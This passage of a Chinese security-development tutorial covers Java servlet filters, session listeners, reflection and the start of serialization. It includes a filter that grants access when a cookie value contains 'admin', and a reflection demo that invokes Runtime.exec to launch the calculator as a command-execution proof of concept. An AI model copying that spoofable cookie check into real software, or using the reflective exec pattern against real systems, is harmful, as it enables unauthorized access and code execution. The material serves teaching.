<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        <span class="keyword">for</span>(Cookie c:cookies)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cName</span> <span class="operator">=</span> c.getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cValue</span> <span class="operator">=</span> c.getValue();</span><br><span class="line">            System.out.println(cName);</span><br><span class="line">            System.out.println(cValue);</span><br><span class="line">            <span class="keyword">if</span>(cValue.contains(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;非管理员访问&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="监听器Listen"><a href="#监听器Listen" class="headerlink" title="监听器Listen"></a>监听器Listen</h1><p>过滤器是访问触发，监听器是动作触发。内存马也有监听器类型</p><p>详细可以参考： <a href="https://blog.csdn.net/qq_52797170/article/details/124023760">https://blog.csdn.net/qq_52797170/article/details/124023760</a></p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>先写一个创建session的文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/cs&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CreateSession</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;创建session&quot;</span>);</span><br><span class="line">        req.getSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写一个销毁session的文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/ds&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DestorySession</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;销毁session&quot;</span>);</span><br><span class="line">        req.getSession().invalidate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们写一个监听session创建与销毁的文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenSession</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;监听到Session创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;监听到Session销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先访问一下销毁session的路由cs，之后再去验证，先创建再销毁，结果如下</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207223153325.png" alt="image-20240207223153325"></p><p>我们可以看到监听器那里的路由只有@WebListener，没有写路径，这可以更好的理解为什么监听器是动作触发</p><p>当我们不停的去访问创建session的路由时，我们只能看到<strong>一次</strong>监听到session创建这个结果</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207223559976.png" alt="image-20240207223559976"></p><h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><p>Java提供了一套反射API，该API由Class类与<strong>java.lang.reflect</strong>类库组成，该类库包含了<strong>Field</strong>、<strong>Method</strong>、<strong>Constructor</strong>等类，对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制，具体可以参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p>为什么要用到反射？</p><p>在运行时而不是编译时，不改变原有代码逻辑，自行运行的时候动态创建和编译即可，动态的创建修改调用获取其属性</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240207225503605.png" alt="image-20240207225503605"></p><p>再简单一点说，反射就是在运行时改变它的值而不用在源码里面重新写</p><p>先写一个demo，取名为User</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">sfz</span> <span class="operator">=</span> <span class="string">&quot;xxxxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">String</span> <span class="variable">company</span> <span class="operator">=</span> <span class="string">&quot;qax&quot;</span>;</span><br><span class="line">    <span class="comment">//构造方法，没有返回值类型,没有return,方法名和类名相同</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//成员方法，有返回值类型,若有返回值类型为空void,则可以不写return,成员方法名和类名不能相同</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">userinfo</span><span class="params">(String name, <span class="type">int</span> age, String sfz, String company)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.sfz = sfz;</span><br><span class="line">        <span class="built_in">this</span>.company = company;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h2><p>四种获取类的方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.demo.User&quot;</span>);</span><br><span class="line">        System.out.println(aClass);</span><br><span class="line">        <span class="comment">// 根据类名：类名.class</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">bClass</span> <span class="operator">=</span> User.class;</span><br><span class="line">        System.out.println(bClass);</span><br><span class="line">        <span class="comment">// 根据对象：对象.getClass()</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cClass</span> <span class="operator">=</span> user.getClass();</span><br><span class="line">        System.out.println(cClass);</span><br><span class="line">        <span class="comment">// 通过类加载器获取Class对象：</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">clsload</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">dClass</span> <span class="operator">=</span> clsload.loadClass(<span class="string">&quot;org.example.demo.User&quot;</span>);</span><br><span class="line">        System.out.println(dClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最常用的是第一种</p><h2 id="反射获取成员变量"><a href="#反射获取成员变量" class="headerlink" title="反射获取成员变量"></a>反射获取成员变量</h2><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240208131958184.png" alt="image-20240208131958184"></p><p>获取变量对象、获取公共成员变量值、赋值公共成员变量值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.demo.User&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有公共成员变量对象 public</span></span><br><span class="line">        Field[] af = aclass.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field fd:af)&#123;</span><br><span class="line">            System.out.println(fd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取所有成员变量对象</span></span><br><span class="line">        Field[] bf = aclass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field fd:bf)&#123;</span><br><span class="line">            System.out.println(fd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取单个公共成员变量对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aclass.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="comment">//获取单个成员变量对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">company</span> <span class="operator">=</span> aclass.getDeclaredField(<span class="string">&quot;company&quot;</span>);</span><br><span class="line">        System.out.println(company);</span><br><span class="line">        <span class="comment">//获取公共成员变量值</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fd</span> <span class="operator">=</span> aclass.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> fd.get(u);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//赋值公共成员变量值</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">v</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">w</span> <span class="operator">=</span> aclass.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        w.set(v,<span class="number">33</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">x</span> <span class="operator">=</span> w.get(v);</span><br><span class="line">        System.out.println(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反射获取构造方法"><a href="#反射获取构造方法" class="headerlink" title="反射获取构造方法"></a>反射获取构造方法</h2><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240208180504998.png" alt="image-20240208180504998"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetConstructor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.demo.User&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有公共构造方法对象</span></span><br><span class="line">        Constructor[] ac = aClass.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor con:ac)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取所有构造方法对象</span></span><br><span class="line">        Constructor[] bc = aClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor con:bc)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取单个公共构造方法对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cc</span> <span class="operator">=</span> aClass.getConstructor(String.class);</span><br><span class="line">        System.out.println(cc);</span><br><span class="line">        <span class="comment">// 获取单个构造方法对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">dc</span> <span class="operator">=</span> aClass.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        System.out.println(dc);</span><br><span class="line">        <span class="comment">// 赋值给构造方法对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ec</span> <span class="operator">=</span> aClass.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        ec.setAccessible(<span class="literal">true</span>);  <span class="comment">//临时开启对私有的访问</span></span><br><span class="line">        <span class="comment">//User u=(User) ec.newInstance(&quot;lisi&quot;,30);</span></span><br><span class="line">        <span class="comment">//System.out.println(u);        //这种写法和下面这一行效果一样，只是一个赋值问题</span></span><br><span class="line">        ec.newInstance(<span class="string">&quot;lisi&quot;</span>,<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">fc</span> <span class="operator">=</span> aClass.getConstructor(String.class);</span><br><span class="line">        fc.newInstance(<span class="string">&quot;wangwu&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反射获取成员方法"><a href="#反射获取成员方法" class="headerlink" title="反射获取成员方法"></a>反射获取成员方法</h2><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240208202427233.png" alt="image-20240208202427233"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.demo.User&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有公共成员方法对象，包括继承、内置的</span></span><br><span class="line">        Method[] am = aClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : am) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取所有成员方法对象，不包括继承、内置的</span></span><br><span class="line">        Method[] bm = aClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : bm) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取单个公共成员方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">cm</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;userinfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class, String.class);</span><br><span class="line">        System.out.println(cm);</span><br><span class="line">        <span class="comment">// 获取单个成员方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">dm</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;userinfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class, String.class);</span><br><span class="line">        System.out.println(dm);</span><br><span class="line">        <span class="comment">// 赋值成员方法对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">em</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;userinfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class, String.class);</span><br><span class="line">        em.invoke(u,<span class="string">&quot;zhaoliu&quot;</span>,<span class="number">22</span>,<span class="string">&quot;123123123&quot;</span>,<span class="string">&quot;lm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反射RCE"><a href="#反射RCE" class="headerlink" title="反射RCE"></a>反射RCE</h2><p>为什么我们要将上述这些操作？举一个简单的命令执行的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetRunExec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//自带的原生写法</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="comment">//反射一步步调用</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">re</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">ree</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">rec</span> <span class="operator">=</span> ree.invoke(aClass);</span><br><span class="line">        re.invoke(rec,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="反-序列化"><a href="#反-序列化" class="headerlink" title="反&#x2F;序列化"></a>反&#x2F;序列化</h1><p>序列化：将内存中的对象压缩成字节流；反序列化：将字节流转化成内存中的对象</p><p>序列化与反序列化的设计就是用来传输数据的，当两个进程进行通信时，可以通过序列化反序列化来进行传输，能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p><p>Java内置的序列化和反序列化协议：writeObject()&#x2F;readObject()、XMLDecoder()&#x2F;XMLEncoder()</p><h2 id="原生使用"><a href="#原生使用" class="headerlink" title="原生使用"></a>原生使用</h2><p>新建一个UserDemo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">company</span> <span class="operator">=</span> <span class="string">&quot;qax&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">Integer</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserDemo</span><span class="params">(String name,String company,Integer age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.company=company;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(company);</span><br><span class="line">        System.out.println(age);</span><br><span class="line">    &#125;</span><br><span class="line">  